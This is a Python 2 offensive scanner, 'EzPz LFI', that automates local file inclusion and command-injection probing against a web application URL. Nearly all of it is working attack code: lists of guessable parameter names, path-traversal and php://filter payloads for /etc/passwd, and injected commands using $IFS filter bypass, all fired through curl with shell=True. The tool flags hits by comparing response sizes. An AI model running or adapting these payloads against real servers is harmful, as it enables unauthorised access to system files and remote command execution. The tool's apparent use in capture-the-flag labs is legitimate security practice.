# !/usr/bin/python
# coding=utf-8

import requests, sys, urllib, re, os, subprocess,time
from subprocess import Popen, PIPE
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

#Variable:
WORKING = []
POSSIBLE_WORKING = []

def header():
	SIG = formatHelp2('''

▓█████ ▒███████▒ ██▓███  ▒███████▒    ██▓      █████▒██▓
▓█   ▀ ▒ ▒ ▒ ▄▀░▓██░  ██▒▒ ▒ ▒ ▄▀░   ▓██▒    ▓██   ▒▓██▒
▒███   ░ ▒ ▄▀▒░ ▓██░ ██▓▒░ ▒ ▄▀▒░    ▒██░    ▒████ ░▒██▒
▒▓█  ▄   ▄▀▒   ░▒██▄█▓▒ ▒  ▄▀▒   ░   ▒██░    ░▓█▒  ░░██░
░▒████▒▒███████▒▒██▒ ░  ░▒███████▒   ░██████▒░▒█░   ░██░
░░ ▒░ ░░▒▒ ▓░▒░▒▒▓▒░ ░  ░░▒▒ ▓░▒░▒   ░ ▒░▓  ░ ▒ ░   ░▓  
 ░ ░  ░░░▒ ▒ ░ ▒░▒ ░     ░░▒ ▒ ░ ▒   ░ ░ ▒  ░ ░      ▒ ░
   ░   ░ ░ ░ ░ ░░░       ░ ░ ░ ░ ░     ░ ░    ░ ░    ▒ ░
   ░  ░  ░ ░               ░ ░           ░  ░        ░  
       ░                 ░          [Customize by H0j3n]             
	''')
    	return SIG

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def formatHelp2(STRING):
    return Style.BRIGHT+Fore.GREEN+STRING+Fore.RESET

def formatHelp3(STRING):
    return Style.BRIGHT+Fore.YELLOW+STRING+Fore.RESET

if __name__ == "__main__":
	print header();
	if len(sys.argv) != 3:
		print formatHelp("(+) Usage:\t python %s options <WEBAPP_URL>" % sys.argv[0])
		print formatHelp("(+) Example:\t python %s paramlfi 'http://10.10.10.10/thankyou.php'" % sys.argv[0])
		print formatHelp("(+) Example:\t python %s log 'http://10.10.10.10/thankyou.php'" % sys.argv[0])
		print formatHelp("(+) Example:\t python %s rce 'http://10.10.10.10/thankyou.php'" % sys.argv[0])
		sys.exit(-1)
	OPTIONS = sys.argv[1]
	SERVER_URL = sys.argv[2]
	if ("http" in SERVER_URL) or ("https" in SERVER_URL):
		if OPTIONS == "paramlfi":
			LIST_PARAM = ["book","download","path","link","cat","dir","file","action","board","date","detail","folder","prefix","page","id","image","include","inc","locate","show","doc","site","type","view","content","mod","conf"]
			LIST_LFI = ["../../../../../../../../../../etc/passwd","php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd","' and die(show_source('/etc/passwd')) or '","php://filter/resource=../../../../../../../../../../../../../etc/passwd","php://filter/read=string.rot13/resource=../../../../../../../../../../etc/passwd"]
			cmd = "curl -s " + SERVER_URL + " | wc -m"
			ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
			original = ps.communicate()[0]
			print formatHelp2("[+] Original Size : " + str(original))
			COUNTWORK = 0
			for i in LIST_PARAM:
				for j in LIST_LFI:
					tmpcmd = "curl -s " + SERVER_URL + "?" + i + "=" + j + " | wc -m"
					ps2 = subprocess.Popen(tmpcmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
					tmpresult = ps2.communicate()[0]
					
					print "[+] TEST #" + str(COUNTWORK)
					if (int(tmpresult)>int(original)):
						print formatHelp2("[+] Possible Working! : " + str(tmpresult))
						print formatHelp3("PAYLOAD -> " + SERVER_URL + "?" + i + "=" + j)
						WORKING.append(SERVER_URL + "?" + i + "=" + j)
						print "\n"
					else:
						if int(tmpresult) == int(original):
							print formatHelp("[+] Not Working! : " + str(tmpresult))
						elif int(tmpresult) < 500 :
							print formatHelp("[+] Not Working! : " + str(tmpresult))
						else:
							print formatHelp2("[+] Possible Working! : " + str(tmpresult))
							print formatHelp3("PAYLOAD -> " + SERVER_URL + "?" + i + "=" + j)
							POSSIBLE_WORKING.append(SERVER_URL + "?" + i + "=" + j)
					COUNTWORK += 1
		elif OPTIONS == "log":
			print "[!] Example Input => book=../../../../../../../../../../.."
			PARAM = str(raw_input("Enter known Parameter for this LFI : "))
			LIST_LFI = open("log.txt","r").read().split("\n")[:-1]
			cmd = "curl -s " + SERVER_URL + " | wc -m"
			ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
			original = ps.communicate()[0]
			print formatHelp2("[+] Original Size : " + str(original))
			COUNTWORK = 0
			for j in LIST_LFI:
				tmpcmd = "curl -s " + SERVER_URL + "?" + PARAM + j + " | wc -m"
				
				ps2 = subprocess.Popen(tmpcmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
				tmpresult = ps2.communicate()[0]
				print "[+] TEST #" + str(COUNTWORK)
				if int(tmpresult) > int(original):
					print formatHelp2("[+] Possible Working! : " + str(tmpresult))
					print formatHelp3("PAYLOAD -> " + SERVER_URL + "?" + PARAM + j)
					WORKING.append(SERVER_URL + "?" + PARAM + j)
					print "\n"
				else:
					print formatHelp("[+] Not Working! : " + str(tmpresult))
				COUNTWORK += 1
		elif OPTIONS == "rce":
			LIST_PARAM = ["cmd","shell","command","cat"]
			LIST_RCE = ["id","whoami","cat /etc/passwd","ls","cat$IFS/etc/passwd","cat${IFS}/etc/passwd"]
			LIST_EXTRA = ["",";"]
			cmd = "curl -s " + SERVER_URL + " | wc -m"
			ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
			original = ps.communicate()[0]
			print formatHelp2("[+] Original Size : " + str(original))
			COUNTWORK = 0
			for i in LIST_PARAM:
				for k in LIST_EXTRA:
					for j in LIST_RCE:
						tmpcmd = "curl -s " + SERVER_URL + "?" + i + "=" + k + j + " | wc -m"
						ps2 = subprocess.Popen(tmpcmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
						tmpresult = ps2.communicate()[0]
						print "[+] TEST #" + str(COUNTWORK)
						try:
							if int(tmpresult) > int(original):
								print formatHelp2("[+] Possible Working! : " + str(tmpresult))
								print formatHelp3("PAYLOAD -> " + SERVER_URL + "?" + i + "=" + j)
								WORKING.append(SERVER_URL + "?" + i + "=" + k + j)
								print "\n"
							else:
								print formatHelp("[+] Not Working! : " + str(tmpresult))
			
									
							COUNTWORK += 1
						except:
							pass
		else:
			print formatHelp("[!] Please put the arguments correctly!")
			sys.exit(-1)
	else:
		print formatHelp("[!] Please put the URL correctly http or https")
		sys.exit(-1)	
	
	print "WORKING LIST!!!"
	for i in WORKING:
		print formatHelp3(i)
	print "\nPOSSIBLE WORKING LIST!!!"
	for k in POSSIBLE_WORKING:
		print formatHelp3(k)

